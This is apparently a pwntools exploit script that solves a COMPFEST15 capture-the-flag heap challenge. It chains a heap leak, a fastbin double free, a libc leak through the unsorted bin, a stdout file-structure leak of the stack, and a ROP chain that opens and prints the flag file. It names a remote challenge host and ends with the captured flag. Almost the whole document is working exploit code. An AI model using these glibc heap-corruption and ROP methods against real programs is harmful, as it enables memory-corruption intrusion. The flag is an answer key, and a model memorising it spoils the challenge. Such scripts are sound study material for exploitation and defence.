#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x000055555555569e
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.101.68.243', 10003)
else:
        p = process(exe.path)

def add(idx, size, price, payload):
    sla(b"> ", b'1')
    sla(b'9): ', str(idx).encode())
    sla(b'size:', str(size).encode())
    sla(b'price:', str(price).encode())
    sa(b'name:', payload)
def free(idx):
    sla(b"> ", b'2')
    sla(b'9): ', str(idx).encode())
def view(idx):
    sla(b"> ", b'4')
    sla(b'9): ', str(idx).encode())
    
    
def leak_heap():
    add(0, 0, 0, b'')    
    free(0)
    add(0, 0, 0, b'')
    view(0)
    p.recvuntil(b"name: ")
    return u64(p.recvline(keepends=False).ljust(0x8, b'\0')) << 12
def leak_libc():
    view(0)
    p.recvuntil(b"name: ")
    return u64(p.recvline(keepends=False).ljust(0x8, b'\0'))
'''
struct item{ // 0x20
    unsigned long price;
    unsigned long name;
}
'''

p.sendline()
# Leak heap
heap = leak_heap()
info("heap: " + hex(heap))
# Fastbin dup
for i in range(9):
    add(i, 0x78, 0x100, b'a')
add(0x9, 0x50, 0x100, b'a')
for i in range(9):
    free(i)
free(7) # double free
free(9)
for i in range(7):
    add(i, 0x78, 0x100, b'a')
# overlap chunk, chunk4
payload = p64((heap+0x750) >> 12 ^ (heap+0x410)) 
add(7, 0x78, 0x100, payload)
add(8, 0x78, 0x100, b'a') # maybe not need, i dont remember
add(9, 0x78, 0x100, b'a') # maybe not need
add(0, 0x78, 0x100, p64(0) + p64(0x20*7 + 0x80*7 + 1)) # ow size -> unsorted bin
free(4) # unsorted bin : chunk 4
# Leak libc
add(0, 0x0, 0x0, b'')
libc.address = leak_libc() - 0x219ce0
info('libc base: ' + hex(libc.address))
# Leak stack, we need free 2 chunk(count = 2),
add(0, 0x78, 0x0, b'a')
free(7)
free(3)
payload = (heap+0x4e0) >> 12 ^ libc.sym._IO_2_1_stdout_
add(0, 0x0, 0x0, b'')
add(0, 0x68, 0x0, b'a' * 0x30 +p64(0) + p64(0x81)+ p64(payload))
add(0, 0x78, 0x0, b'a')
payload = flat(
    0xfbad1800,0xfbad1800, 0xfbad1800, 0xfbad1800,
    libc.sym.environ, libc.sym.environ + 8
)
add(0, 0x78, 0x0, payload)
stack = u64(p.recvline()[1:9])
info("stack: " + hex(stack))

# flag
free(6) # free 2 chunk, count = 2
free(1)
add(0, 0x60, 0x0,b'a')
add(0, 0x20, 0x0,b'a')
payload = flat(0, 0x81, (heap + 0x620) >> 12 ^ (stack-0x148))
add(0, 0x60, 0x0,payload)
# add(0, 0x78, 0x0, b'./\0') # use for sys_getdents
add(0, 0x78, 0x0, b'./flag-e9fa6b1fd75b2ae57fcb0e66790584.txt\0') # use for read file flag

pop_rdi = libc.address+0x000000000002a3e5
pop_rsi = libc.address+0x000000000002be51
pop_rdx_r12 = libc.address+0x000000000011f497
pop_rax = libc.address + 0x0000000000045eb0
ret =libc.address+0x0000000000029cd6
syscall = libc.address + 0x0000000000091396
payload = flat(
    0, 
    pop_rdi,stack - 0x128,   # gets to write more
    libc.sym.gets,
)

GDB()
print(hex(len(payload)))
add(0, 0x78, 0x0, payload)
input("shell 2")
# payload = flat(
#     pop_rdi,heap+0x620 , 
#     pop_rsi, 0,
#     libc.sym.open,
#     pop_rdi, 3,
#     pop_rdx_r12, 0x1000, 0,
#     pop_rax, 78,
#     syscall,
#     pop_rdi, 1,
#     pop_rsi, heap+0x620,
#     pop_rdx_r12, 0x1000, 0,
#     libc.sym.write
# )
payload = flat(
    pop_rdi,heap+0x620 , 
    pop_rsi, 0,
    libc.sym.open,
    pop_rdi, 3,
    pop_rdx_r12, 0x100, 0,
    libc.sym.read,
    pop_rdi, heap+0x620,
    libc.sym.puts
)
sl(payload)
p.interactive()
# COMPFEST15{Hello_heapnote_my_0ld_friend__I_ve_c0m3_to_pwn_y0u_4g41n_7f2aff1af5}